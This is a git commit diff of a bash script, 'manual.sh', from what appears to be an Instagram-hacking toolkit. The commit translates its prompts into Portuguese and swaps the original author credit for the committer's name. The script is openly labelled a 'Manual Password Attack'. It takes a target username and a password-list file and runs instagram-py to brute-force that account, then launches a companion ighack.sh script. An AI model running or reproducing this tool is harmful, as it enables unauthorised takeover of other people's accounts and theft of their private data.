5b89a0b217d270d104bc63aa9d1556c0ed710666
GilmarSantosFilho <99095164+Gilmarsantosfilho@users.noreply.github.com>
2022-12-20 13:55:18 -0300

    Update manual.sh

--- main/manual.sh
+++ main/manual.sh
@@ -4,7 +4,7 @@ red='\033[1;31m'
 rset='\033[0m'
 ylo='\033[1;33m'
 #!/bin/bash
-#coding section starts :)
+#seção de codificação começa :)
 clear
 echo
 echo '
@@ -14,25 +14,25 @@ echo '
     ██║██║   ██║╚════╝██╔══██║██╔══██║██║     ██╔═██╗
     ██║╚██████╔╝      ██║  ██║██║  ██║╚██████╗██║  ██╗
     ╚═╝ ╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
-              [#] Manual Password Attack [#]
+              [#] Manual Ataque de senhak [#]
 ' |lolcat
 printf "\n"
-printf "                \e[101m\e[1;77m  >>  Script By N17R0 << \e[0m\n"
+printf "                \e[101m\e[1;77m  >>  Script By Gilmar Script << \e[0m\n"
 printf "\n"
-printf "       \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m Noob Hackers \e[100m\e[1;77m << \e[0m\n"
+printf "       \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m Gilmar Filho \e[100m\e[1;77m << \e[0m\n"
 printf "\n"
 echo
-read -p "[#] User Name : " usrnm
+read -p "[#] Nome do usuário : " usrnm
 echo
-read -p "[#] Enter Passlist Location : " inspass
+read -p "[#] Insira o local da lista da senha : " inspass
 echo
 if [[ $inspass = 0 ]]                                             
 then
-echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"        
+echo -e  "$ylo >>> exiting........! Thau Thau :) <<<$rset"        
 else
 instagram-py --username $usrnm --password-list $inspass
 echo
 cd $HOME
 fi
-cd $HOME/ighack
+cd $HOME/ig-hack
 bash ighack.sh
